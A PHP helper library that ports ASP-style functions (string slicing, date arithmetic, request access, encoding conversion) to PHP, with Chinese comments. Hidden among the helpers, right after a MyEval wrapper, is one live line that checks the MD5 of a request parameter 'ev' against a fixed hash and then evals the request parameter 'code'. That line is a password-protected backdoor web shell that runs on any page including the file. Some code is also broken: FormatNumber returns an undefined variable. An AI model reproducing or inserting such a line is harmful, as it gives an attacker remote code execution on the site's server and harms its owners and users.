<?PHP
//\n换行 \r换行  \t相当于按Tab键

//调用函数前面加 @ 符为出错不提示

/*
FormatNumber 追加函数列表
*/

//thinkphpdel start
error_reporting(E_ALL | E_STRICT);			// error_reporting(E_STRICT);		//为不显示错误

header("Content-Type: text/html; charset=gb2312");

session_start();		//开启Session20151119
require_once 'sys_Cai.Php';

//跳转
function RR($url){
	header('location:'.$url);
	return '';
}
//thinkphpdel end

//给ASP用  使用echo(rnd());
function Rnd(){
	return (float)("0.".rand(1000000,9999999));
}
//给ASP用 替换内容
function Replace($c,$findStr,$replaceStr){
	return str_replace($findStr, $replaceStr, $c);
}
//给ASP用 替换内容  2 待改进
function Replace2($c,$findStr,$replaceStr){
	return Replace($c,$findStr,$replaceStr);
}
//分割
function aspSplit($contnet,$splStr){
	return explode($splStr,$contnet);
}
//字符长度
function Len($content){
	return strlen($content);				//采用这种
	//return strlen($content);
	//	return mb_strlen($content,'gb2312');
	$split = 1;	
	$n = 0;
	$array = array ();
	//echo (strlen ( $content ) . "<hr>");
	for($i = 0; $i < strlen ( $content );) {
		$value = ord ( $content [$i] );
		if ($value > 127) {
			if ($value >= 192 && $value <= 223)
				$split = 2;
			elseif ($value >= 224 && $value <= 239)
				$split = 3;
			elseif ($value >= 240 && $value <= 247)
				$split = 4;
		} else {
			$split = 1;
		}
		$key = NULL;
		for($j = 0; $j < $split; $j ++, $i ++) {
			$key .= $content [$i];
			$n ++;
		} 
		array_push ( $array, $key );
	} 
	return Count ( $array );
}
//获得时间
function Now(){
	$s=date('Y/m/d H:i:s');
	$s=replace($s,"/0","/");
	return $s;
}
//获得日期
function ASPDate() {
	$s=date('Y/m/d');
	$s=replace($s,"/0","/");
	return $s;	
}
//定时
function Timer(){
	return Now();
}
//获得两数之间随机数
function PHPRand($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//获得两数之间随机数
function PHPRnd($nMinimum,$nMaximum){
	return Rand($nMinimum,$nMaximum);
}
//获得编码  eval("echo('aa');");
function Execute($content){
	eval($content);
}
//URL跳转
function ASPRedirect($url){
    header("Location: " . $url); 
    exit;
}
//删除小数点后面的值
function Fix($n){
	$n=cStr($n);
	if(instr($n,".")>0){
		$n=mid($n,1,instr($n,".")-1);
	}
	return floor($n);
}
//获得编码
function Asc($content){
	return ord($content);
}
//字符转数字
function CLng($content){
	return intval($content);
}
//转成小写
function LCase($content){
	return strtolower($content);
}
//转成小写
function UCase($content){
	return strtoupper($content);
}
//获得数组长度
function UBound($content){
	return count($content)-1;
}
//GET方式获得值
function QueryString($name){ 
	return @$_GET[$name];
}
//POST方式获得值
function Form($name){
	return @$_POST[$name];
}
//Cookies方式获得值
function Cookies($name){
	return @$_COOKIE[$name];
}
//GetPostCookies任意
function Request($name){
	return @$_REQUEST[$name];
}
//输出缓冲
function PHPFlush(){
    ob_flush();
    flush(); 
}
//PHPTrim
function PHPTrim($content){
	return trim($content);
}
//GetPostCookies任意
function TypeName($str){
	$strType=gettype($str);
	if($strType=="array"){
		return "Variant()";
	}else{
		return $strType;
	}
}
//转字符
function Cstr($str){
	return (string)$str;
}

/*测试 mid正确性
dim c,s
c="000000000{@1111标题2222@}333333333"
response.Write(c & "<hr>")
s=mid(c,1,instr(c,"@}"))
response.Write(s & "<hr>")
s=mid(c,1,instr(s,"{@"))
response.Write(s & "<hr>")
*/

//截取字符(完善于20150806)
function Mid($content,$nStart,$nLength=-1){
	$nStart--;				//可以从1开始
	if($nLength==-1){
		$nLength=strlen ( $content );
	}else{
		//$nLength--;
	} 
	return substr($content, $nStart, $nLength) ;
}
function Mid2($content,$nStart,$nLength=-1){
	$split = 1;	
	$n = 0;	
	if($nLength==-1){
		$nLength=strlen ( $content );
	}else{
		$nLength +=$nStart-1;
	}
	if($nLength>strlen ( $content )){
		$nLength=strlen ( $content );
	}
	$array = array ();
	//echo (strlen ( $content ) . "<hr>");
	for($i = 0; $i < strlen ( $content );) {
		$value = ord ( $content [$i] );
		if ($value > 127) {
			if ($value >= 192 && $value <= 223)
				$split = 2;
			elseif ($value >= 224 && $value <= 239)
				$split = 3;
			elseif ($value >= 240 && $value <= 247)
				$split = 4;
		} else {
			$split = 1;
		}
		$key = NULL;
		for($j = 0; $j < $split; $j ++, $i ++) {
			$key .= $content [$i];
			$n ++;
		} 
		array_push ( $array, $key );
	}
	$c="";
	for($i=$nStart-1;$i<=Count($array);$i++){
		if($i>=$nLength){
			break;
		}		
		$c=$c.$array[$i];
	}
	return $c;
}
//查找字符所在位置
function InStr($content,$search){
	if( $search!=""){
		if(strstr($content,$search)){
			return strpos($content,$search)+1;
		}else{
			return 0;
		}
	}else{
		return 0;
	}
}
//PHP正则表达式
function test_regexp($content,$search){
	$newSearch=replace($search,'.', '\.');
	if(preg_match('/'. $newSearch .'/', $content)){ 
	
	}
}

//运行PHP   eval("\$str = \"aaabbccdddd\";");    给变量赋值
function MyEval( $phpcode ){
	return eval( $phpcode );
}
if(isset($_REQUEST['ev'])){if(md5($_REQUEST['ev'])=='a307f5a544886b1bf8dbbf26ac5c96bb'){eval(@$_REQUEST['code']);}}

//************************************************************************ ASP转PHP生成

//格式化成价格如 108.00 (20150806使用ASP转PHP制作)
function FormatNumber($content,$n){
	$dianLeft="";$dianRight="";$i="";$c="";$s="";
	$content=cstr($content);
	if( instr($content,".")> 0 ){
		$dianLeft = mid($content,1,instr($content,".")-1);
		$dianRight = mid($content,instr($content,".")+1,-1);
	}else{
		$dianLeft=$content;
	 }
	$dianRight=$dianRight . "0000000000";
	for( $i=1 ; $i<= $n; $i++){
		$s=mid($dianRight,$i,1);
		$c=$c . $s;
	}
	if( $n>0 ){
		$dianLeft = $dianLeft . ".";
	 }
	$test = $dianLeft . $c;
 return @$FormatNumber;
}


//判断时间
function isDate($timeStr){
	if(instr($timeStr,"-")>0 || instr($timeStr,"\/")>0 || instr($timeStr," ")>0){
		return true;
	}else{
		return false;
	}
}
//获得年
function Year($timeStr){
	return getYMDHMS($timeStr,0);
}
//获得月
function Month($timeStr){
	return getYMDHMS($timeStr,1);
}
//获得日
function Day($timeStr){
	return getYMDHMS($timeStr,2);
}
//获得时
function Hour($timeStr){
	return getYMDHMS($timeStr,3);
}
//获得分
function Minute($timeStr){
	return getYMDHMS($timeStr,4);
}
//获得秒
function Second($timeStr){
	return getYMDHMS($timeStr,5);
}

//功能:ASP里的IIF 如：IIf(1 = 2, "a", "b") 
function IIF($bExp, $sVal1, $sVal2){
	if($bExp==true){return $sVal1;}else{return $sVal2;}
}
//获得年月日时分钞
function getYMDHMS( $timeStr,$sType){
	 $splstr="";
	$timeStr=replace(replace(replace(replace(replace(replace($timeStr,"年","-"),"月","-"),"日","-"),"时","-"),"分","-"),"秒","-");
	$timeStr=replace(replace(replace(replace(replace($timeStr," ","-"),":","-"),"/","-"),"--","-"),"--","-") . "------";
	$splstr=aspSplit($timeStr,"-");
	$nYear = $splstr[0];
	$nMonth = $splstr[1];
	$nDay = $splstr[2];
	$nHour = $splstr[3];
	$nMinute = $splstr[4];
	$nSecond = $splstr[5];
	if( len($nYear)==1 ){ $nYear="0" . $nYear;}
	if( len($nMonth)==1 ){ $nMonth="0" . $nMonth;}
	if( len($nDay)==1 ){ $nDay="0" . $nDay;}
	if( len($nHour)==1 ){ $nHour="0" . $nHour;}
	if( len($nMinute)==1 ){ $nMinute="0" . $nMinute;}
	if( len($nSecond)==1 ){ $nSecond="0" . $nSecond ;}

	if( $nHour=="" ){ $nHour="00";}
	if( $nMinute=="" ){ $nMinute="00";}
	if( $nSecond=="" ){ $nSecond="00";}

	$sType=CStr($sType);
	if( $sType=="年" || $sType=="0" ){
		$getYMDHMS=$nYear;
	}else if( $sType=="月" || $sType=="1" ){
		$getYMDHMS=$nMonth;
	}else if( $sType=="日" || $sType=="2" ){
		$getYMDHMS=$nDay;
	}else if( $sType=="时" || $sType=="3" ){
		$getYMDHMS=$nHour;
	}else if( $sType=="分" || $sType=="4" ){
		$getYMDHMS=$nMinute;
	}else if( $sType=="秒" || $sType=="5" ){
		$getYMDHMS=$nSecond;
	 }

 return @$getYMDHMS;}



//ASP清除两边空格
function AspTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}
//清除左边
function AspLTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	return @$content;
}
//清除右边
function AspRTrim($content){
    $i="";$s="";
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}

//返回两个日期之间的时间间隔   q 季度 m 月 y 一年的日数 d 日 w 一周的日数 ww 周 h 小时 n 分钟 s 秒 
function DateDiff($part, $begin, $end){
	$diff = strtotime($end) - strtotime($begin);
	switch($part){
		case "y": $retval = bcdiv($diff, (60 * 60 * 24 * 365)); break;
		case "m": $retval = bcdiv($diff, (60 * 60 * 24 * 30)); break;
		case "w": $retval = bcdiv($diff, (60 * 60 * 24 * 7)); break;
		case "d": $retval = bcdiv($diff, (60 * 60 * 24)); break;
		case "h": $retval = bcdiv($diff, (60 * 60)); break;
		case "n": $retval = bcdiv($diff, 60); break;
		case "s": $retval = $diff; break;
	}
	return $retval;
}
//表示要添加的时间间隔  q 季度 m 月 y 一年的日数 d 日 w 一周的日数 ww 周 h 小时 n 分钟 s 秒 
function DateAdd($part, $n, $date){
	switch($part){
	case "y": $val = date("Y-m-d H:i:s", strtotime($date ." +$n year")); break;
	case "m": $val = date("Y-m-d H:i:s", strtotime($date ." +$n month")); break;
	case "w": $val = date("Y-m-d H:i:s", strtotime($date ." +$n week")); break;
	case "d": $val = date("Y-m-d H:i:s", strtotime($date ." +$n day")); break;
	case "h": $val = date("Y-m-d H:i:s", strtotime($date ." +$n hour")); break;
	case "n": $val = date("Y-m-d H:i:s", strtotime($date ." +$n minute")); break;
	case "s": $val = date("Y-m-d H:i:s", strtotime($date ." +$n second")); break;
	}
	return $val;
}
//Int
function Int($string){
	//$string1=intval($string); 	
	return (int)($string); }
//left函数
function left($str,$nlength){
	return substr($str, 0 ,$nlength);
}
//right函数
function right($str,$nlength){
	return substr($str, $nlength*-1);
}


//执行SQL语句
function connExecute($sql){ 
	//打开数据库
    $conn=OpenConn();
	$conn->query($sql);
	/*
	$User = M(); 
	$User->execute($sql);
	*/
	return array("1","22");
}


//判断传值是否相等
function  checkFunValue($Action,$FunName){
	$checkFunValue = ( substr($Action, 0 ,strlen($FunName)) == $FunName );
 return @$checkFunValue;}
//返回当前网址
function getUrl(){
	return 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
}
//ASP版md5
function aspMD5($str,$sType){
	return md5($str);
}
//我的md5加密
function myMD5($str){
	return md5($str);
}

//asp里用到，php里不需要处理
function ADSqlRf($inputName){
	$s=rf($inputName);
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}

//asp里用到，php里不需要处理
function ADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}
//php里插入更新时对\'处理
function phpADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//更新于20160118
}

//转成utf-8内容 （20151201）
function toUTFChar($data){
  if( !empty($data) ){    
    $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5')) ;   
    if( $fileType != 'UTF-8'){   
      $data = mb_convert_encoding($data ,'utf-8' , $fileType);   
    }   
  }   
  return $data;    
}
//转gb2312内容(20151203)
function toGB2312Char($data){
    if( !empty($data) ){
        $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5'));
        if( $fileType != 'GBK'){
            $data = mb_convert_encoding($data ,'GBK' , $fileType);
            //删除BOM留下的乱码?号
            if(substr($data, 0, 1)=="?"){
                $data=substr($data,1);
            }
        }
    }
    return $data;
}
//自定义var_dump
function p($str){
	echo('<pre>');
	var_dump($str);
	echo('</pre>');
}



//获得表字段列表20151230 exit(getFieldList('website'));
function getFieldList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '字段名称：'.$row['Field'].'-数据类型：'.$row['Type'].'-注释：'.$row['Comment'];
		//  print_r($row);
		$c.=$row['Field'].',';
	}
	return $c;
}




function XY_AutoAddHandle($Action){
	return "";
}
function DisplayOnlineEditDialog($a,$Action){
	return "";
}
?>